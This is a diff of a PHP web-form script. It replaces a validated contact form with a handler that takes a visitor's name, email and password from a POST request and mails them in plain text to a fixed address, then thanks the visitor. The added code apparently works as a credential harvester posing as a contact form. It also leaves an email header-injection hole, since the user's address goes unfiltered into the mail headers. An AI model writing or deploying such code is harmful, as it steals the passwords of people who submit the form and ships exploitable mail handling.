@@ -1,69 +1,28 @@
-﻿<?php
+<?php
+if(isset($_POST['email'])) {
+    $email_to = "email";
+    $email_subject = "subject";
+    $first_name = $_POST['first_name']; // required
+    $email_from = $_POST['email']; // required
+    $password = $_POST['password']; 
+    function clean_string($string) {
+    $bad = array("content-type","bcc:","to:","cc:","href");
+    return str_replace($bad,"",$string);
+    }
+    $email_message = "Form details below.\n\n";
+    $email_message .= "Name: ".clean_string($first_name)."\n";
+    $email_message .= "Email: ".clean_string($email_from)."\n";
+    $email_message .= "password: ".clean_string($password)."\n";
+  
+// email 
+$headers = 'From: '.$email_from."\r\n".
+'Reply-To: '.$email_from."\r\n" .
+'X-Mailer: PHP/' . phpversion();
+mail($email_to, $email_subject, $email_message, $headers);
+?>
+  <!-- include your own success html here -->
 
-// Replace this with your own email address
-$siteOwnersEmail = 'akumar5@umbc.edu';
-
-
-if($_POST) {
-
-   $name = trim(stripslashes($_POST['contactName']));
-   $email = trim(stripslashes($_POST['contactEmail']));
-   $subject = trim(stripslashes($_POST['contactSubject']));
-   $contact_message = trim(stripslashes($_POST['contactMessage']));
-
-   // Check Name
-	if (strlen($name) < 2) {
-		$error['name'] = "Please enter your name.";
-	}
-	// Check Email
-	if (!preg_match('/^[a-z0-9&\'\.\-_\+]+@[a-z0-9\-]+\.([a-z0-9\-]+\.)*+[a-z]{2}/is', $email)) {
-		$error['email'] = "Please enter a valid email address.";
-	}
-	// Check Message
-	if (strlen($contact_message) < 15) {
-		$error['message'] = "Please enter your message. It should have at least 15 characters.";
-	}
-   // Subject
-	if ($subject == '') { $subject = "Contact Form Submission"; }
-
-
-   // Set Message
-   $message .= "Email from: " . $name . "<br />";
-	$message .= "Email address: " . $email . "<br />";
-   $message .= "Message: <br />";
-   $message .= $contact_message;
-   $message .= "<br /> ----- <br /> This email was sent from your site's contact form. <br />";
-
-   // Set From: header
-   $from =  $name . " <" . $email . ">";
-
-   // Email Headers
-	$headers = "From: " . $from . "\r\n";
-	$headers .= "Reply-To: ". $email . "\r\n";
- 	$headers .= "MIME-Version: 1.0\r\n";
-	$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
-
-
-   if (!$error) {
-
-      ini_set("sendmail_from", $siteOwnersEmail); // for windows server
-      $mail = mail($siteOwnersEmail, $subject, $message, $headers);
-
-		if ($mail) { echo "OK"; }
-      else { echo "Something went wrong. Please try again."; }
-		
-	} # end if - no validation error
-
-	else {
-
-		$response = (isset($error['name'])) ? $error['name'] . "<br /> \n" : null;
-		$response .= (isset($error['email'])) ? $error['email'] . "<br /> \n" : null;
-		$response .= (isset($error['message'])) ? $error['message'] . "<br />" : null;
-		
-		echo $response;
-
-	} # end if - there was a validation error
-
+  <div class="feedback">Thanks for submiting we will get back to you as soon as possable</div>
+  <?php
 }
-
 ?>
